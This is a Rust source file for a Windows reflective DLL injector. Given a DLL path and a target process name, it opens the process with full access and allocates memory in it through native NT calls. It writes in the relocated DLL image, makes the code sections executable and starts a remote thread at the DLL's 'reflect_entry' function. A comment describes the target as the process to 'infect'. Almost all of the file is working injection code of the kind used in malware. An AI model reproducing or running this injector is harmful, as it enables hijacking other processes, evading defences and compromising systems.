use std::ffi::{OsString, c_void};
use std::{
    path::Path,
    process::exit,
    ptr::{null, null_mut},
};

use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_CHARACTERISTICS};
use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
use windows_sys::Win32::System::Threading::CreateRemoteThread;
use windows_sys::Win32::{
    Foundation::{CloseHandle, GetLastError, HANDLE},
    System::{
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE},
        Threading::{OpenProcess, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS},
        WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
    },
};

mod proc_info;

/*
arg 1: dll to inject
arg 2: name of process to infect
 */

fn main() {
    let str_path = std::env::args().nth(1).unwrap();
    let pe_path = Path::new(&str_path);
    let (pe, pe_size) = match pe_mapper::map_pe(pe_path, PAGE_READWRITE) {
        Err(e) => {
            println!("[!]Mapping of PE failed with: {}", e);
            exit(1);
        }
        Ok(pe) => pe,
    };

    let str_proc_name = std::env::args().nth(2).unwrap();
    let os_str_proc_name = OsString::from(str_proc_name);

    unsafe {
        let vproc_info = match proc_info::query_process_info_from_name(&os_str_proc_name) {
            Err(e) => {
                println!("[!] {}", e);
                exit(1);
            }
            Ok(v) => v,
        };

        let proc_info = vproc_info.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;
        let proc_id = (*proc_info).UniqueProcessId as u32;
        println!(
            "[+] Process {} found with id:{}",
            os_str_proc_name.to_string_lossy(),
            proc_id
        );

        let h_proc = OpenProcess(PROCESS_ALL_ACCESS, 0, proc_id);
        if h_proc.is_null() {
            println!("[!] Failed to open target process: 0x{:x}", GetLastError());
            exit(1);
        }

        let mut region_size = pe_size;
        let mut injected_mem = null_mut();
        let status = nt_impl::NtAllocateVirtualMemory(
            h_proc,
            &mut injected_mem,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if status < 0 {
            CloseHandle(h_proc);
            println!("[!] Failed memory allocation 0x{:x}", status);
            exit(1);
        }

        println!("[+] Allocatd memory at: 0x{:x}", injected_mem as usize);

        pe_mapper::fix_reloc_from(pe, injected_mem as _);

        let pe_entry_point = ld::get_proc_addr_str(pe, "reflect_entry");
        let relative_entry_point = pe_entry_point as usize - pe as usize;
        let remote_entry_point = injected_mem as usize + relative_entry_point;
            println!("[+] reflect_entry RVA: 0x{:x} => 0x{:x}",relative_entry_point, remote_entry_point);

        let mut written = 0;
        let status =
            nt_impl::NtWriteVirtualMemory(h_proc, injected_mem as _, pe, pe_size, &mut written);
        if status < 0 {
            CloseHandle(h_proc);
            println!("[!] Failed memory write err:0x{:x}  written:0x{:x}", status, written);
            exit(1);
        }

        set_section_execute_read(pe, h_proc, injected_mem);

        let mut h_thread = null_mut();
        let status = nt_impl::NtCreateThreadEx(
            &mut h_thread,
            THREAD_ALL_ACCESS,
            null(),
            h_proc,
            remote_entry_point as _,
            injected_mem,
            0,
            0,
            0,
            0,
            null_mut(),
        );

        if status < 0{
            println!("[!] Failed to create thread 0x{:x}",status);
            CloseHandle(h_proc);
            exit(1);
        }

        println!("[+] Thread created");
        CloseHandle(h_proc);
    }
}


const IMAGE_SCN_MEM_EXECUTEREAD: IMAGE_SECTION_CHARACTERISTICS =
    IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
const IMAGE_SCN_MEM_EXECUTEREADWRITE: IMAGE_SECTION_CHARACTERISTICS =
    IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
pub fn set_section_execute_read(image: *mut c_void, h_proc:HANDLE, remote_base_addr:*mut c_void ) {
    unsafe {
        let dos_hdr = image as *const IMAGE_DOS_HEADER;
        let nt_hdr = image.byte_add((*dos_hdr).e_lfanew as _) as *const IMAGE_NT_HEADERS64;

        for section in pe_parser::SectionIter::from_nt_hdr(nt_hdr) {
            //Keep only the flags we care about
            let mem_charac = (*section).Characteristics & IMAGE_SCN_MEM_EXECUTEREADWRITE;
            let protection = match mem_charac {
                IMAGE_SCN_MEM_EXECUTEREAD => PAGE_EXECUTE_READ,
                _ => { continue; }
            };

            let mut old_prot = 0;
            let mut addr = remote_base_addr.byte_add((*section).VirtualAddress as _);
            let mut byte_count = (*section).SizeOfRawData as usize;
            let success = nt_impl::NtProtectVirtualMemory(
                h_proc,
                &mut addr,
                &mut byte_count,
                protection,
                &mut old_prot,
            );
            if success < 0 {
                panic!();
            }
        }
    }
}
